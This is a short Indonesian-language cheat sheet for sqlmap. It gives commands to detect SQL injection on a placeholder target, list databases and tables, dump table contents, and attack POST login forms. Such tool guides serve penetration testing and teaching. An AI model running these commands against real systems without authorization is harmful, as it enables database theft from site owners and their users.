# Basic Command

## Pemasangan

```bash
sudo apt install -y sqlmap
```

## Empat Tangga

Tangga 1, tes param rawan:

```bash
sqlmap -u "http://target/index.php?id=1" --batch
```

Tangga 2, daftar database:

```bash
sqlmap -u "http://target/index.php?id=1" --batch --dbs
```

Tangga 3, pilih database, daftar tabel:

```bash
sqlmap -u "http://target/index.php?id=1" --batch -D nama_db --tables
```

Tangga 4, pilih tabel, dump isinya:

```bash
sqlmap -u "http://target/index.php?id=1" --batch -D nama_db -T nama_tabel --dump
```

## Target POST Pakai Request File

Save request dari Burp ke file, terus:

```bash
sqlmap -r request.txt --batch
```

## Target POST Langsung

```bash
sqlmap -u "http://target/login.php" --data "username=admin&password=test" --batch
```

## Tes Lebih Dalam

```bash
sqlmap -u "http://target/index.php?id=1" --batch --level 3 --risk 2
```

## Keterangan Opsi

-u      URL target
-r      request file dari Burp
--data  body POST langsung
--batch jawab semua prompt otomatis
--dbs   daftar database
-D      pilih database
--tables daftar tabel
-T      pilih tabel
--dump  dump isi tabel
--level 3 --risk 2  tes lebih dalam
